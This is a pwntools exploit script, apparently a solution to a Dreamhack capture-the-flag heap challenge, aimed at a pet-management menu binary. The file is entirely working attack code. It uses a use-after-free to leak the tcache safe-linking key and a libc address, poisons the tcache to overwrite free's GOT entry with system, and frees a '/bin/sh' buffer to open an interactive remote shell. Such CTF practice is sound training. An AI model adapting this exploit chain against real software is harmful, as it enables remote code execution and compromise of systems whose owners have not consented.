from pwn import *

HOST, PORT = '0.0.0.0', 31337
# HOST, PORT = '0.0.0.0', 31338
HOST, PORT = 'host3.dreamhack.games', 12430
r = remote(HOST, PORT)


def get(t, idx):
    match t:
        case 'cat':
            r.sendlineafter(b': ', b'1')
        case 'dog':
            r.sendlineafter(b': ', b'5')
    r.sendlineafter(b': ', b'%d'%idx)

def see(t, idx):
    match t:
        case 'cat':
            r.sendlineafter(b': ', b'2')
        case 'dog':
            r.sendlineafter(b': ', b'6')
    r.sendlineafter(b': ', b'%d'%idx)

def pet(t, idx, data):
    match t:
        case 'cat':
            r.sendlineafter(b': ', b'3')
        case 'dog':
            r.sendlineafter(b': ', b'7')
    r.sendlineafter(b': ', b'%d'%idx)
    r.sendafter(b': ', data)

def release(t, idx):
    match t:
        case 'cat':
            r.sendlineafter(b': ', b'4')
        case 'dog':
            r.sendlineafter(b': ', b'8')
    r.sendlineafter(b': ', b'%d'%idx)


get('cat', 0)
release('cat', 0)
see('cat', 0)
r.recvuntil(b'says: ')
key = u64(r.recv(8))
print(hex(key))

for i in range(9):
    get('cat', i)
for i in range(7):
    release('cat', i)

get('dog', 0)
release('cat', 8)
see('cat', 8)
r.recvuntil(b'says: ')
libc = u64(r.recv(8)) - 0x21ace0

release('cat', 7)
get('cat', 10)
release('cat', 8)
system = libc + 0x50d70
free_got = 0x404018

get('dog', 1)
pet('dog', 1, b'A'*0x98+p64(0xa1)+p64(free_got-0x18^key))

get('cat', 11)
get('cat', 12)
pet('cat', 12, b'A'*0x18+p64(system))

pet('dog', 0, b'/bin/sh\x00')
release('dog', 0)

r.interactive()